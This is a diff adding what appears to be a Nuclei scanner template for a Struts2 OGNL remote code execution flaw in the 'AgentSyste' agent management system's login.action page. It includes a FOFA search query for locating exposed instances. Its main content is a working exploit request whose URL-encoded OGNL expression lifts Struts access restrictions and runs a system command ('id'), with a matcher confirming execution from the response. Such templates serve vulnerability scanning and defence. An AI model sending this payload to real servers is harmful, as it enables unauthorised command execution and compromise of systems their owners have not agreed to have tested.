@@ -1,0 +1,39 @@
+id: agentSyste-login-action-rce
+info:
+  name: AgentSyste代理商管理系统 login.action Struts2 远程代码执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/AgentSyste%E4%BB%A3%E7%90%86%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/AgentSyste%E4%BB%A3%E7%90%86%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20login.action%20Struts2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/AgentSyste%E4%BB%A3%E7%90%86%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20login.action%20Struts2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md
+    - https://github.com/gelusus/wxvl/blob/314312bc60156a311916ba58b56f8f4f521bf74c/doc/2025-04/%E6%9F%90%E4%BB%A3%E7%90%86%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="AgentSyste代理商管理系统"
+    tips:
+    repair:
+    version:
+  tags: rce,agentSyste
+
+http:
+  - raw:
+      - |
+        POST /login.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0
+        Content-Type: application/x-www-form-urlencoded
+
+        debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()
+                
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
